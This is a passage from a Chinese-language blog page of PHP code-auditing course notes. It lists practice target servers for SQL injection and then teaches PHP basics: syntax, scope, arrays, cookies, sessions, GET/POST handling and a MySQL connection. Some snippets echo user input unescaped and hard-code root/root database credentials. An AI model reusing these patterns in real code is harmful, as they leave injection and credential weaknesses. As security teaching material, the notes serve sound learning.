<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="靶机： 综合：http:&#x2F;&#x2F;175.24.71.146:18002&#x2F; sql注入：http:&#x2F;&#x2F;175.24.71.146:18003&#x2F; 代码审计基础PHP的4种标记风格 XML风格  123&lt;?php&#x2F;&#x2F;官方默认风格?&gt;   短标签风格  123&lt;?&#x2F;&#x2F;短标签风格?&gt;   ASP风格  123&lt;%&#x2F;&#x2F;ASP风格%&gt;   JavaScript">
<meta property="og:type" content="article">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/2020/09/30/test/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="靶机： 综合：http:&#x2F;&#x2F;175.24.71.146:18002&#x2F; sql注入：http:&#x2F;&#x2F;175.24.71.146:18003&#x2F; 代码审计基础PHP的4种标记风格 XML风格  123&lt;?php&#x2F;&#x2F;官方默认风格?&gt;   短标签风格  123&lt;?&#x2F;&#x2F;短标签风格?&gt;   ASP风格  123&lt;%&#x2F;&#x2F;ASP风格%&gt;   JavaScript">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="c:/Users/51763/Desktop/pic/微信截图_20200607132202.png">
<meta property="og:image" content="c:/Users/51763/Desktop/pic/微信截图_20200607132400.png">
<meta property="og:image" content="c:/Users/51763/Desktop/pic/微信图片_20200606003529.png">
<meta property="og:image" content="c:/Users/51763/Desktop/pic/微信截图_20200606003936.png">
<meta property="og:image" content="c:/Users/51763/Desktop/pic/微信截图_20200606004142.png">
<meta property="og:image" content="c:/Users/51763/Desktop/pic/微信图片_20200607104011.png">
<meta property="og:image" content="c:/Users/51763/Desktop/pic/微信截图_20200607104825.png">
<meta property="og:image" content="c:/Users/51763/Desktop/pic/微信截图_20200607110842.png">
<meta property="og:image" content="c:/Users/51763/Desktop/pic/微信截图_20200607111532.png">
<meta property="og:image" content="c:/Users/51763/Desktop/pic/微信截图_20200607111751.png">
<meta property="og:image" content="http://goodcheerleung.gitee.io/blog/nc.png">
<meta property="og:image" content="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200701172652.png">
<meta property="og:image" content="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200701172836.png">
<meta property="og:image" content="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200701212357.png">
<meta property="og:image" content="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200701212731.png">
<meta property="og:image" content="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200701220402.png">
<meta property="og:image" content="http://goodcheerleung.gitee.io/blog/image-20200701220500585.png">
<meta property="og:image" content="http://img.kawhi.xyz/image-20200716193858963.png">
<meta property="og:image" content="http://img.kawhi.xyz/image-20200719095020181.png">
<meta property="og:image" content="http://img.kawhi.xyz/image-20200719095807318.png">
<meta property="og:image" content="http://img.kawhi.xyz/image-20200724162439697.png">
<meta property="og:image" content="http://img.kawhi.xyz/image-20200719101835878.png">
<meta property="og:image" content="http://img.kawhi.xyz/image-20200719103520386.png">
<meta property="og:image" content="http://img.kawhi.xyz/image-20200711123022767.png">
<meta property="og:image" content="http://goodcheerleung.gitee.io/blog/QQ%E6%88%AA%E5%9B%BE20200716100155.png">
<meta property="og:image" content="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200716100505.png">
<meta property="og:image" content="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200716100628.png">
<meta property="og:image" content="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200716132630.png">
<meta property="og:image" content="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200716133026.png">
<meta property="og:image" content="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200716133238.png">
<meta property="og:image" content="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200716133317.png">
<meta property="og:image" content="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200716231058.png">
<meta property="og:image" content="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200716231357.png">
<meta property="og:image" content="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200716231504.png">
<meta property="og:image" content="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200716232655.png">
<meta property="og:image" content="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200716232734.png">
<meta property="og:image" content="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200716235614.png">
<meta property="og:image" content="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200716235728.png">
<meta property="og:image" content="http://img.kawhi.xyz/image-20200728221140367.png">
<meta property="og:image" content="http://img.kawhi.xyz/image-20200728222459957.png">
<meta property="og:image" content="http://img.kawhi.xyz/image-20200728221743464.png">
<meta property="og:image" content="http://img.kawhi.xyz/image-20200728222548407.png">
<meta property="og:image" content="http://img.kawhi.xyz/image-20200728222754050.png">
<meta property="og:image" content="http://img.kawhi.xyz/image-20200728223336499.png">
<meta property="og:image" content="http://img.kawhi.xyz/image-20200728223734169.png">
<meta property="og:image" content="http://img.kawhi.xyz/image-20200728224538820.png">
<meta property="article:published_time" content="2020-09-30T14:00:54.323Z">
<meta property="article:modified_time" content="2020-08-06T05:10:56.291Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="c:/Users/51763/Desktop/pic/微信截图_20200607132202.png">

<link rel="canonical" href="http://example.com/2020/09/30/test/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title> | Hexo</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Hexo</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/09/30/test/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-09-30 22:00:54" itemprop="dateCreated datePublished" datetime="2020-09-30T22:00:54+08:00">2020-09-30</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-08-06 13:10:56" itemprop="dateModified" datetime="2020-08-06T13:10:56+08:00">2020-08-06</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>靶机：</p>
<p>综合：<a target="_blank" rel="noopener" href="http://175.24.71.146:18002/">http://175.24.71.146:18002/</a></p>
<p>sql注入：<a target="_blank" rel="noopener" href="http://175.24.71.146:18003/">http://175.24.71.146:18003/</a></p>
<h1 id="代码审计基础"><a href="#代码审计基础" class="headerlink" title="代码审计基础"></a>代码审计基础</h1><h3 id="PHP的4种标记风格"><a href="#PHP的4种标记风格" class="headerlink" title="PHP的4种标记风格"></a>PHP的4种标记风格</h3><ul>
<li>XML风格</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//官方默认风格</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>短标签风格</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="comment">//短标签风格</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>ASP风格</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">&#x2F;&#x2F;ASP风格</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>JavaScript风格</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script languange=<span class="string">&quot;php&quot;</span>&gt;</span><br><span class="line"><span class="comment">//js风格</span></span><br><span class="line">&lt;/script&gt; </span><br></pre></td></tr></table></figure>

<h3 id="变量与常量"><a href="#变量与常量" class="headerlink" title="变量与常量"></a>变量与常量</h3><ul>
<li>变量， <code>$ </code>符号开始，后面跟着变量的名称.<ul>
<li>变量名称必须以字母为开头</li>
<li>构成变量名的字符（A-z、0-9 和 _ ）</li>
<li>严格区分大小写</li>
<li>php是一种弱类型的语言所以可以无需声明变量直接使用，也无需声明变量类型</li>
</ul>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$x=<span class="number">5</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>全局变量，在函数内调用全局变量需要，global关键字</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$x=<span class="number">5</span>;</span><br><span class="line">$y=<span class="number">10</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myTest</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $x,$y;</span><br><span class="line">    $y=$x+$y;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">myTest();</span><br><span class="line"><span class="keyword">echo</span> $y; <span class="comment">// 输出 15</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><p>作用域/函数</p>
<ul>
<li>Static 作用域</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">static</span> $x=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">echo</span> $x;</span><br><span class="line">	 $x++;</span><br><span class="line">&#125;</span><br><span class="line">f();<span class="comment">//0</span></span><br><span class="line">f();<span class="comment">//1</span></span><br></pre></td></tr></table></figure>

<ul>
<li>参数作用域</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myTest</span>(<span class="params">$x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $x;</span><br><span class="line">&#125;</span><br><span class="line">myTest(<span class="number">5</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>常量</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">&quot;Gzmtu&quot;</span>, <span class="string">&quot;广州航海学院&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> Gzmtu;</span><br></pre></td></tr></table></figure>

<ul>
<li>销毁变量</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">unset($a);</span><br></pre></td></tr></table></figure>

<ul>
<li>系统常量(魔术常量)</li>
</ul>
<table>
<thead>
<tr>
<th>ID</th>
<th>常量</th>
<th>注释</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>__FILE__</td>
<td>当前文件路径</td>
</tr>
<tr>
<td>2</td>
<td>__DIR__</td>
<td>当前文件目录</td>
</tr>
<tr>
<td>3</td>
<td>__LINE__</td>
<td>在文件文件的那一行</td>
</tr>
<tr>
<td>4</td>
<td>__FUNCTION__</td>
<td>在当前文件的那个函数中    返回 函数名</td>
</tr>
<tr>
<td>5</td>
<td>__CLASS__</td>
<td>在当前文件中的那个类中    返回 类名</td>
</tr>
<tr>
<td>6</td>
<td>__METHOD__</td>
<td>在当前文件的类中的那个方法中 返回 类名::方法名</td>
</tr>
</tbody></table>
<h3 id="几种基本输出"><a href="#几种基本输出" class="headerlink" title="几种基本输出"></a>几种基本输出</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hello world!&quot;</span>;<span class="comment">//只能打印字符串</span></span><br><span class="line">print_r(<span class="string">&quot;hello world!&quot;</span>);<span class="comment">//能够打印数组和字符串</span></span><br><span class="line">var_dump(<span class="string">&quot;hello world!&quot;</span>);<span class="comment">//能够打印数组和字符串同时输出打印内容的数据类型</span></span><br><span class="line">var_export(<span class="string">&quot;hello world!&quot;</span>,<span class="literal">true</span>);<span class="comment">//能够将字符串转换为php代码，第二个参数设置为true能够返回值</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;hello world!&quot;</span>);<span class="comment">//结束程序并打印内容</span></span><br><span class="line"><span class="keyword">echo</span> sprintf(<span class="string">&quot;%s&quot;</span>,<span class="string">&quot;abc&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="分支语句"><a href="#分支语句" class="headerlink" title="分支语句"></a>分支语句</h3><ul>
<li>if语句</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(exp)&#123;<span class="comment">//判断条件</span></span><br><span class="line"><span class="comment">//条件成立时候执行的代码块</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>switch语句</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">switch</span> (expr)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> label1:</span><br><span class="line">  expr = label1 时执行的代码 ;</span><br><span class="line">  <span class="keyword">break</span>;  </span><br><span class="line"><span class="keyword">case</span> label2:</span><br><span class="line">  expr = label2 时执行的代码 ;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"> 其他情况执行的代码块;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="PHP中的数组-遍历数组"><a href="#PHP中的数组-遍历数组" class="headerlink" title="PHP中的数组/遍历数组"></a>PHP中的数组/遍历数组</h3><ul>
<li>数组</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$c=<span class="keyword">array</span>(<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>,<span class="string">&quot;Toyota&quot;</span>);</span><br><span class="line">var_dump($c);</span><br><span class="line"><span class="keyword">echo</span> $c[<span class="number">0</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $c[<span class="number">1</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $c[<span class="number">2</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">print_r($c);</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($c);$i++)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $c[$i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>关联数组</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$age=<span class="keyword">array</span>(<span class="string">&quot;Peter&quot;</span>=&gt;<span class="string">&quot;35&quot;</span>,<span class="string">&quot;Ben&quot;</span>=&gt;<span class="string">&quot;37&quot;</span>,<span class="string">&quot;Joe&quot;</span>=&gt;<span class="string">&quot;43&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>($age <span class="keyword">as</span> $x=&gt;$x_value) <span class="comment">//(原数组 as )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Key=&quot;</span> . $x . <span class="string">&quot;, Value=&quot;</span> . $x_value;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="登陆保持"><a href="#登陆保持" class="headerlink" title="登陆保持"></a>登陆保持</h3><ul>
<li>Cookies,保存在本地具备一定生命周期的临时文件。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setcookie(name, value, expire, path, domain);</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>name</td>
<td>必需。规定 cookie 的名称。</td>
</tr>
<tr>
<td>value</td>
<td>必需。规定 cookie 的值。</td>
</tr>
<tr>
<td>expire</td>
<td>可选。规定 cookie 的过期时间。 time()+3600<em>24</em>30 将设置 cookie 的过期时间为 30 天。如果这个参数没有设置，那么 cookie 将在 session 结束后（即浏览器关闭时）自动失效。</td>
</tr>
<tr>
<td>path</td>
<td>可选。规定 cookie 的服务器路径。如果路径设置为 “/“，那么 cookie 将在整个域名内有效.如果路径设置为 “/test/“，那么 cookie 将在 test 目录下及其所有子目录下有效。默认的路径值是 cookie 所处的当前目录。</td>
</tr>
<tr>
<td>domain</td>
<td>可选。规定 cookie 的域名。为了让 cookie 在 example.com 的所有子域名中有效，您需要把 cookie 的域名设置为 “.example.com”。当您把 cookie 的域名设置为 <a target="_blank" rel="noopener" href="http://www.example.com/">www.example.com</a> 时，cookie 仅在 www 子域名中有效。</td>
</tr>
<tr>
<td>secure</td>
<td>可选。规定是否需要在安全的 HTTPS 连接来传输 cookie。如果 cookie 需要在安全的 HTTPS 连接下传输，则设置为 TRUE。默认是 FALSE。</td>
</tr>
</tbody></table>
<ul>
<li>实例</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">setcookie(<span class="string">&#x27;username&#x27;</span>,<span class="string">&quot;admin&quot;</span>,time()+<span class="number">3600</span>);</span><br><span class="line"><span class="keyword">echo</span> $_COOKIE[<span class="string">&#x27;username&#x27;</span>];</span><br></pre></td></tr></table></figure>

<ul>
<li>Session，基于cookie，但是数据存储在服务器，本地利用cookies存储一个session。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">&#x27;admin&#x27;</span>]=<span class="string">&#x27;sb&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> $_SESSION[<span class="string">&#x27;admin&#x27;</span>];</span><br></pre></td></tr></table></figure>

<h3 id="使用两种基本的HTTP协议"><a href="#使用两种基本的HTTP协议" class="headerlink" title="使用两种基本的HTTP协议"></a>使用两种基本的HTTP协议</h3><ul>
<li>GET</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> $_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;?a&#x3D;hello world</span><br></pre></td></tr></table></figure>

<ul>
<li>POST <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> $_POST[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">	&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;a&quot;</span>&gt;</span><br><span class="line">	&lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;    </span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="Mysql数据库连接与查询"><a href="#Mysql数据库连接与查询" class="headerlink" title="Mysql数据库连接与查询"></a>Mysql数据库连接与查询</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">date_default_timezone_set(<span class="string">&#x27;Asia/Shanghai&#x27;</span>);<span class="comment">//设置时区</span></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<span class="comment">//设置当前文本编码</span></span><br><span class="line">$server = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">$username = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">$passwd = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">$dbname = <span class="string">&quot;xiaoming&quot;</span>;</span><br><span class="line">$conn = <span class="keyword">new</span> mysqli($server,$username,$passwd,$dbname);</span><br><span class="line"><span class="keyword">if</span> ($conn-&gt;connect_error&lt;&gt;<span 